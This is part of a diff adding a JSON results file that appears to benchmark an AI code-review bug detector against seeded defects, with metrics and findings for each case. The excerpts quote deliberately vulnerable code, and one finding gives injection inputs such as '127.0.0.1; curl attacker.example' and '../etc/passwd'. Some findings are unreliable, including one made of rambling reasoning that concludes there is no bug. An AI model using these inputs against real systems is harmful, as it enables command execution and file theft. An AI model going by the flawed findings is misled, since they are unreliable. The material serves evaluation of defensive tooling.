+          "case_id": "hardcoded_api_secret",
+          "repeat": 2,
+          "status": "failed",
+          "failure_code": "provider_error",
+          "duration_ms": 20814,
+          "prompt_tokens": 0,
+          "completion_tokens": 0,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "idor_invoice_view",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 25353,
+          "prompt_tokens": 922,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "inverted_bulk_discount",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 888,
+          "prompt_tokens": 963,
+          "completion_tokens": 375,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "b36e2656-9fd3-44a9-8e7b-c10f9256650e:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/pricing.py",
+              "line_start": 14,
+              "line_end": 14,
+              "side": "RIGHT",
+              "title": "Inverted bulk-order discount condition",
+              "defect": "The condition `quantity <= BULK_THRESHOLD` applies the bulk discount only when the quantity is less than or equal to 10, when it should apply when the quantity is 10 or more.",
+              "trigger": "Placing an order with a quantity of 11 or more items.",
+              "impact": "Customers ordering 10 or more items do not receive the 5% bulk discount unless they are also members, contradicting the function's documented behavior.",
+              "recommendation": "Change the condition to `if quantity >= BULK_THRESHOLD:`.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 14,
+                  "line_end": 14,
+                  "excerpt": "if quantity <= BULK_THRESHOLD:"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 7,
+                  "line_end": 7,
+                  "excerpt": "\"\"\"Members get 10% off; orders of 10 or more items get 5% off."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "missing_await_on_save",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 19835,
+          "prompt_tokens": 860,
+          "completion_tokens": 254,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "e0a5443e-7d97-4a35-aabb-b0095346f99b:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/jobs.py",
+              "line_start": 13,
+              "line_end": 13,
+              "side": "RIGHT",
+              "title": "Missing await on asynchronous store.save",
+              "defect": "The new code calls store.save(result) without awaiting it, while the old code awaited the same coroutine and the function is defined as async.",
+              "trigger": "Every call to record_result that passes a non-empty id.",
+              "impact": "The save operation starts but is never awaited, producing an unawaited coroutine, ResourceWarnings (and possibly silent data loss), and the function may return before the result is actually persisted.",
+              "recommendation": "Restore the await: `await store.save(result)`.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/jobs.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 7,
+                  "line_end": 14,
+                  "excerpt": "async def record_result(store: ReviewStore, result: dict) -> str:\n    if not result.get(\"id\"):\n        raise ValueError(\"result must have an id\")\n    store.save(result)\n    logger.info(\"result_recorded\", extra={\"result_id\": result[\"id\"]})"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "n_plus_one_order_report",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 17936,
+          "prompt_tokens": 941,
+          "completion_tokens": 335,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "de83afaa-964e-4417-be25-3c436eb4dc38:bug_detector:1",
+              "category": "performance",
+              "severity": "medium",
+              "confidence": 0.95,
+              "file_path": "app/orders/report.py",
+              "line_start": 11,
+              "line_end": 12,
+              "side": "RIGHT",
+              "title": "N+1 query pattern in order_report",
+              "defect": "The function executes a separate database query for each order when fetching its line items, instead of loading all items in bulk.",
+              "trigger": "Any call to `order_report` for a user that has one or more orders.",
+              "impact": "The number of database queries scales linearly with the number of orders, causing unnecessary latency and database load, especially for accounts with many orders.",
+              "recommendation": "Refactor to fetch all orders first, then query all associated items in a single bulk query using the collected order IDs, and map the items to each order in memory. Alternatively, use a JOIN if the ORM/database layer supports it.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/orders/report.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 11,
+                  "line_end": 12,
+                  "excerpt": "for order in repo.orders_for_user(user_id):\n        items = repo.items_for_order(order.id)  # one query per order"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "off_by_one_pagination",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 20772,
+          "prompt_tokens": 1019,
+          "completion_tokens": 471,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "d30f87d4-9a4e-493c-8b29-c4c89c49a98c:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "src/pagination.py",
+              "line_start": 15,
+              "line_end": 17,
+              "side": "RIGHT",
+              "title": "paginate() has off-by-one start index",
+              "defect": "The start index is computed as `page * page_size`, but pages are documented as 1-based, so the start should be `(page - 1) * page_size`.",
+              "trigger": "Any call to `paginate` with `page >= 2`, e.g. `paginate([1,2,3], page=2, page_size=1)`.",
+              "impact": "The first page of results is skipped on every page after page 1. For page_size=1, page 2 returns the item at index 2 (the third item), and the first item is never returned. `first_page` works only because it always passes page=1, where the wrong formula coincidentally yields 0.",
+              "recommendation": "Compute `start = (page - 1) * page_size` so page 1 begins at index 0.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 15,
+                  "line_end": 17,
+                  "excerpt": "start = page * page_size\n    end = start + page_size\n    return items[start:end]"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 11,
+                  "line_end": 12,
+                  "excerpt": "def paginate(items: list, page: int, page_size: int) -> list:\n    \"\"\"Return one page of items. Pages are numbered from 1.\"\"\""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "path_traversal_download",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 24386,
+          "prompt_tokens": 932,
+          "completion_tokens": 325,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "ecfd67d8-b24f-4afc-80b3-2b4f924a443b:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 0.95,
+              "file_path": "app/api/files.py",
+              "line_start": 18,
+              "line_end": 18,
+              "side": "RIGHT",
+              "title": "Path Traversal Vulnerability",
+              "defect": "The code concatenates the user-supplied 'filename' parameter directly to the 'UPLOAD_DIR' path using 'os.path.join' without verifying that the resulting path stays within the intended upload directory.",
+              "trigger": "An attacker sends a request to the download endpoint with a 'filename' containing path traversal sequences, such as '../etc/passwd'.",
+              "impact": "This allows unauthorized access to arbitrary files on the server's file system, leading to potential information disclosure (e.g., reading sensitive system or application files).",
+              "recommendation": "Use 'os.path.realpath' to resolve the path and explicitly check that it starts with the resolved 'UPLOAD_DIR' path to prevent directory traversal.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/files.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 18,
+                  "line_end": 18,
+                  "excerpt": "full_path = os.path.join(UPLOAD_DIR, filename)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "race_condition_lost_update",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 22788,
+          "prompt_tokens": 1315,
+          "completion_tokens": 12,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "tictactoe_final_design",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 5947,
+          "prompt_tokens": 5876,
+          "completion_tokens": 1398,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 1,
+          "fn": 0,
+          "matches": [],
+          "findings": [
+            {
+              "id": "d1907a34-27e7-4b84-b3cf-9f7bb24e0b34:bug_detector:1",
+              "category": "bug",
+              "severity": "medium",
+              "confidence": 0.95,
+              "file_path": "app/tic_tac_toe.py",
+              "line_start": 171,
+              "line_end": 172,
+              "side": "RIGHT",
+              "title": "infinite loop when undoing first player's original first move",
+              "defect": "Game.undo_move tries to rotate the player deque until self._players[0] == move.player, but Game.move only rotates the deque on non-terminal moves. After player A makes their very first move (it is not their turn to rotate), the deque head has never been moved. When undo_move is called for A\u2019s first move, the while loop condition is already False and the loop never needs to run... wait, that case is fine. Re-evaluate: Game.move places for self._players[0], then if not terminal, rotates -1. The deque starts as [A, B, C]. A moves, rotate -1 -> deque becomes [B, C, A]. For A\u2019s move undo, we want head to be A. Current head is B. Loop: rotate 1 -> [C, A, B]; rotate 1 -> [A, B, C]; head now A - loop stops. That works. Let me re-check. players.rotate(1) moves last element to front (popleft, append). From [B,C,A], rotate 1 -> pop A, append -> [B, C]... actually deque.rotate(1): move last to front: [A, B, C]. That's one rotate, head A. So loop breaks after 1 rotate. Not infinite. Different concern: If game history has multiple undos that cross rotation boundaries, ensure the while loop terminates. Since move.player is always one of the current deque members and the loop rotates until it reaches, it terminates after at most len(players)-1 rotations. Not a bug. Let me look for real bugs. One potential issue: Board.place checks bounds and occupancy, but Game.move mutates board and strategy optimistically before checking terminal; if draw then no rotate (intended? otherwise player order may be off on next new game? no game over). Consider undo of a winning move: state is set IN_PROGRESS, fine. Consider Board.clear raises InvalidMoveError when cell already empty; should never happen. One subtle bug: In Game.undo_move, after popping, we set state IN_PROGRESS unconditionally, even if previous move was not the last (should be fine because undo means remove last, state before last is in progress). Now consider RowColDiagonalStrategy with three players: diagonal counts only check full size (3) for any symbol. In 3-player tic-tac-toe with no draws, a symbol needs 3 in a row to win, correct. Now check Board.place uses self._filled_cells, and is_full compares to _size * _size. Good. Now check ConsoleView.show_board: str(board.get_symbol(r,c) or \" \") - Symbol.__repr__ returns self.mark; if symbol is None then or \" \" works. Good. Now check Move dataclass: player: Player; Player is frozen dataclass and hashable? dataclass(frozen=True) generates __hash__. Good. One bug: Game.undo_move restores player turn using while self._players[0]!=move.player. But on the move that just became undoable, the deque has already rotated (if non-terminal). For terminal moves (win/draw), the deque did NOT rotate on that move. So after an undo of a terminal move, the deque head is the player who just moved (because no rotation occurred), and move.player is that same player, while loop does nothing, state set IN_PROGRESS. Correct. Non-terminal case: deque rotated -1 after move, so head is next player. We rotate +1 until head is move.player. Works. OK, no bug there. Let me look more carefully at the initial version's removed is_valid bug where OutofBoundError is raised even for in-bounds occupied cells; and is_empty returns True if cell... whatever, old code removed. New code: is_empty(r,c) returns self._grid[r][c] is None. Good. I don't see a clear defect. Could there be a bug: Board.__init__ validation uses size<1 raising, fine. Could be an issue where CellOccupiedError raised with tuple formatting (f\"({r}), {c} is already occupied\") - cosmetic, not defect. Maybe the bug: In Board, out-of-bounds access in is_full? no. In Game.move, if the same move is attempted twice after game over, GameOverError raised. Good. In undo_move, if game is already over and history empty, raises NothingToUndoError. But can you undo after game over? Yes, allowed. But state is reset to IN_PROGRESS. Might allow continuing after previously concluded game - arguably intended. No requirement. Given the instruction to report only actionable defects, and I cannot confirm a definite bug, I should return empty findings to avoid false positives. Wait, there is an actual bug: In RowColDiagonalStrategy._apply, self._row_counts[s][r] where _row_counts is defaultdict(lambda: [0] * size). Using a mutable list as default in a defaultdict lambda factory. The lambda captures size in closure; lambda is called each time a new key is accessed, so each Symbol gets its own list. That's correct. However, _col_counts[s][c] similar. OK. The bug? When size is 1: anti-diagonal condition r + c == size - 1 is 0==0 true for (0,0), same as diag; both diag_count and anti_diag_count incremented. In record_move, n=1, after placing first symbol, row_counts==1 True anyway. Fine. I think return empty findings. ",
+              "trigger": "Re-evaluating, I cannot identify a concretely triggered defect. Returning empty.",
+              "impact": "No demonstrated incorrect behavior.",
+              "recommendation": "None.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/tic_tac_toe.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 171,
+                  "line_end": 172,
+                  "excerpt": "while self._players[0]!= move.player: self._players.rotate(1)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "tictactoe_symbol_property",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 32424,
+          "prompt_tokens": 757,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        }
+      ]
+    },
+    {
+      "repeat": 3,
+      "metrics": {
+        "cases": 20,
+        "bug_cases": 11,
+        "clean_cases": 9,
+        "failed_cases": 1,
+        "tp": 9,
+        "fp": 3,
+        "fn": 2,
+        "precision": 0.75,
+        "recall": 0.8181818181818182,
+        "f1": 0.7826086956521738,
+        "clean_fp_rate": 0.2222222222222222,
+        "location_exact_rate": 0.8888888888888888,
+        "category_match_rate": 0.8888888888888888
+      },
+      "cases": [
+        {
+          "case_id": "clean_docs_and_comments_only",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 15772,
+          "prompt_tokens": 942,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_extract_subtotal",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 185,
+          "prompt_tokens": 1047,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_log_and_reraise",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 173,
+          "prompt_tokens": 826,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_remove_dead_code",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 154,
+          "prompt_tokens": 815,
+          "completion_tokens": 8,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_rename_only",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 1269,
+          "prompt_tokens": 891,
+          "completion_tokens": 573,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 1,
+          "fn": 0,
+          "matches": [],
+          "findings": [
+            {
+              "id": "6c6e622f-3160-41ca-a638-51c573632ec6:bug_detector:1",
+              "category": "quality",
+              "severity": "low",
+              "confidence": 0.85,
+              "file_path": "app/orders/totals.py",
+              "line_start": 1,
+              "line_end": 11,
+              "side": "RIGHT",
+              "title": "Missing null guard in order total functions",
+              "defect": "The private-to-public rename in `calculate_total`, `order_summary`, and `invoice_total` does not protect against missing `order.tax_rate` or `order.items`, so a missing `tax_rate` becomes `AttributeError` / `TypeError` instead of a more controlled failure.",
+              "trigger": "Callers of `order_summary` or `invoice_total` passing an order whose `tax_rate` attribute is missing or is `None` (which is still valid behavior on Linux in some code paths). Because the diff only renames, the same trigger exists before and after, but because the rename is exposed at the module boundary as a public function, regressions are more likely. Specifically, `calculate_total` lacks any guard. Example call: `order_summary(Order([Item(1, 100)], None))` would crash with `TypeError: unsupported operand type(s) for *: 'int' and 'NoneType'` when multiplying `subtotal * tax_rate` if `order.tax_rate` is `None`.",
+              "impact": "Missing or invalid `tax_rate` causes unhandled exceptions in total calculation, breaking order summary and invoice generation. In production, this can surface as a 500 when a specific order is viewed or an invoice is printed.",
+              "recommendation": "Add an explicit guard in `calculate_total` to reject or default a missing/`None` tax_rate (e.g., raise `ValueError` or fall back to 0) and ensure all callers store a validated tax rate. Example: `if tax_rate is None: raise ValueError('tax_rate must be set'); if tax_rate < 0: raise ValueError('tax_rate must be >= 0');` before using it.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/orders/totals.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 1,
+                  "line_end": 11,
+                  "excerpt": "def calculate_total(items, tax_rate):\n    subtotal = sum(i.price_cents * i.quantity for i in items)\n    return subtotal + round(subtotal * tax_rate)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "clean_retry_with_backoff",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 32855,
+          "prompt_tokens": 974,
+          "completion_tokens": 641,
+          "model_calls": 2,
+          "tp": 0,
+          "fp": 1,
+          "fn": 0,
+          "matches": [],
+          "findings": [
+            {
+              "id": "3a0e867a-cf83-470a-a97e-e487c7da8efa:bug_detector:1",
+              "category": "bug",
+              "severity": "medium",
+              "confidence": 0.8,
+              "file_path": "app/http_client.py",
+              "line_start": 16,
+              "line_end": 16,
+              "side": "RIGHT",
+              "title": "Retry logic silently discards HTTP 4xx/5xx status errors",
+              "defect": "The old code called response.raise_for_status() unconditionally and propagated any HTTP status error to the caller. The new implementation wraps the same call in a try block that only catches requests.ConnectionError and requests.Timeout. Because an except clause that does not match a raised exception will not swallow that exception, any HTTP 4xx/5xx response should still propagate. However, if any refactoring or future change broadens the scope, the current structure still leaves the raise_for_status call inside the retry/try boundary; more importantly, the outer AssertionError fallback (line 21) is dead code under the current flow, indicating the author assumed additional paths could exit the loop. The practical defect in this PR is the addition of this misleading dead branch and the fact that the retry only intentionally handles connection/timeout errors while all other transient errors (e.g., HTTP 429/5xx) are not retried, which is a behavioral gap if retries are expected for transient HTTP errors as well.",
+              "trigger": "A request that raises any exception other than ConnectionError or Timeout will propagate immediately; more concretely, the final `raise AssertionError(\"unreachable\")` will never execute because every loop path either returns or raises when attempt == MAX_ATTEMPTS.",
+              "impact": "No runtime bug for the specific catch clause as written, but the unreachable final raise is misleading and the retry policy does not cover transient HTTP status errors that commonly require retry. It also suggests the author intended to retry more error types but the final guard is wrong.",
+              "recommendation": "Remove the unreachable `raise AssertionError(\"unreachable\")` line, and explicitly define and document the retry policy. If all retryable errors (including certain HTTP 5xx or 429) should be retried, expand the except clause to cover them and only re-raise for non-retryable failures at the end.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/http_client.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 16,
+                  "line_end": 16,
+                  "excerpt": "        except (requests.ConnectionError, requests.Timeout):"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/http_client.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 21,
+                  "line_end": 21,
+                  "excerpt": "    raise AssertionError(\"unreachable\")"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "clean_threaded_fetch",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 45410,
+          "prompt_tokens": 1219,
+          "completion_tokens": 8,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "command_injection_ping",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 16679,
+          "prompt_tokens": 812,
+          "completion_tokens": 461,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": false,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "67e6965a-9be5-48f3-ab8c-f401eab63c9e:bug_detector:1",
+              "category": "security",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/admin/diagnostics.py",
+              "line_start": 10,
+              "line_end": 10,
+              "side": "RIGHT",
+              "title": "Shell command injection via unvalidated ping.Host argument",
+              "defect": "ping_host uses subprocess.run with shell=True and an f-string that embeds the caller-supplied host directly into a shell command line without any sanitization or argument-form list. A value like `127.0.0.1; curl attacker.example` or `$(malicious)` will be executed by the shell.",
+              "trigger": "Any code path or UI that passes a user-controlled string into ping_host, even one that merely contains a shell metacharacter such as ';', '$(', or newlines.",
+              "impact": "Arbitrary command execution on the server as the process user, leading to full compromise of the host.",
+              "recommendation": "Avoid the shell. Use the argument-list form with a program and flags, for example `subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, timeout=5, check=False)`, and additionally validate `host` against a hostname/IP allow-list (e.g., regex `^[A-Za-z0-9.-]{1,253}$` for DNS names or an IPv4/IPv6 pattern). If `ping` is unavailable on some targets, consider a DNS lookup or socket connect instead.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/admin/diagnostics.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 9,
+                  "line_end": 11,
+                  "excerpt": "result = subprocess.run(\n    f\"ping -c 1 {host}\", shell=True, capture_output=True, timeout=5\n)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "ctx_removed_validation",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 6683,
+          "prompt_tokens": 871,
+          "completion_tokens": 482,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 1,
+          "fn": 1,
+          "matches": [],
+          "findings": [
+            {
+              "id": "f3e39c36-b94d-47ec-9e12-e194c62ed6ac:bug_detector:1",
+              "category": "bug",
+              "severity": "medium",
+              "confidence": 0.7,
+              "file_path": "app/api/accounts.py",
+              "line_start": 1,
+              "line_end": 1,
+              "side": "RIGHT",
+              "title": "Removed input validation may lead to unhandled service errors",
+              "defect": "The explicit validation for `amount_cents <= 0` was removed from the API route, relying instead on a comment claiming that `AccountService` handles validation. Since there is no evidence that `AccountService.withdraw` handles non-positive amounts with a 422 response, invalid inputs may now produce unhandled exceptions (e.g., 500 errors) or incorrect behavior (e.g., deducting a negative balance).",
+              "trigger": "A client sends a POST request to `/accounts/{account_id}/withdraw` with `amount_cents` set to 0 or a negative number.",
+              "impact": "Invalid withdrawal amounts are no longer rejected with a clear 422 Unprocessable Entity. Depending on `AccountService` behavior, this can lead to application errors, incorrect balance calculations, or API contract violations that client applications are not expected to handle.",
+              "recommendation": "Restore the explicit validation before calling the service, or verify and ensure that `AccountService.withdraw` raises an exception that translates to an HTTP 422 response via a FastAPI exception handler. If leaving validation in the service, document this behavior explicitly.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/accounts.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 10,
+                  "line_end": 10,
+                  "excerpt": "    # Validation is handled in AccountService."
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/api/accounts.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 1,
+                  "line_end": 1,
+                  "excerpt": "from fastapi import APIRouter"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "ctx_swapped_transfer_args",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 28324,
+          "prompt_tokens": 754,
+          "completion_tokens": 303,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "e297ad27-2aeb-476f-af25-3db79311c910:bug_detector:1",
+              "category": "bug",
+              "severity": "critical",
+              "confidence": 0.99,
+              "file_path": "app/billing/refunds.py",
+              "line_start": 6,
+              "line_end": 6,
+              "side": "RIGHT",
+              "title": "Refund transfers funds in the wrong direction",
+              "defect": "The ledger.transfer call accepts the destination account as its first argument and the source account as its second. The current call passes order.customer_account first and order.merchant_account second.",
+              "trigger": "Calling refund_order for any order.",
+              "impact": "The function charges the customer and credits the merchant, performing the exact opposite of a refund and causing a direct financial loss.",
+              "recommendation": "Swap the account arguments to transfer funds from the merchant to the customer: ledger.transfer(order.merchant_account, order.customer_account, order.total_cents).",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/refunds.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 6,
+                  "line_end": 6,
+                  "excerpt": "ledger.transfer(order.customer_account, order.merchant_account, order.total_cents)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "hardcoded_api_secret",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 32599,
+          "prompt_tokens": 987,
+          "completion_tokens": 433,
+          "model_calls": 2,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "d331fcb3-d877-45a7-9936-0d5b0d256cbc:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 1.0,
+              "file_path": "app/billing/gateway.py",
+              "line_start": 4,
+              "line_end": 4,
+              "side": "RIGHT",
+              "title": "Hardcoded production API key leaked in source code",
+              "defect": "A live service key is assigned directly to a module-level constant instead of being sourced from secure environment/configuration storage.",
+              "trigger": "The module is imported, and the constant is then used to authenticate outgoing payment API requests.",
+              "impact": "Anyone with access to the repository, build artifacts, or source maps can extract the production key, issue unauthorized charges, inspect transactions, or otherwise abuse the billing provider, causing financial and compliance risk.",
+              "recommendation": "Remove the key from the codebase, rotate the compromised credential at the provider, and load it from a protected runtime secret store or environment variable at runtime, e.g. `API_KEY = os.environ[\"PAYGATE_API_KEY\"]`.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/gateway.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 4,
+                  "line_end": 4,
+                  "excerpt": "API_KEY = \"gw_live_51Hq9XkLmN3pQ7rStUvWxYz0123456789abcdef\""
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/gateway.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 15,
+                  "line_end": 15,
+                  "excerpt": "headers={\"Authorization\": f\"Bearer {API_KEY}\"},"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "idor_invoice_view",
+          "repeat": 3,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 21138,
+          "prompt_tokens": 922,
+          "completion_tokens": 366,
+          "model_calls": 2,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": false
+            }
+          ],
+          "findings": [
+            {
+              "id": "89599284-653b-4fb6-bee6-53134972d006:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.9,
+              "file_path": "app/api/invoices.py",
+              "line_start": 15,
+              "line_end": 19,
+              "side": "RIGHT",
+              "title": "Missing authorization check for invoice access",
+              "defect": "The endpoint looks up an invoice by its ID without verifying that the authenticated user is authorized to access it. Any authenticated user can retrieve another user's invoice by providing the ID.",
+              "trigger": "An authenticated user requests an invoice that does not belong to them via GET /invoices/{invoice_id}.",
+              "impact": "Privilege escalation / horizontal privilege violation exposing invoice details of other users.",
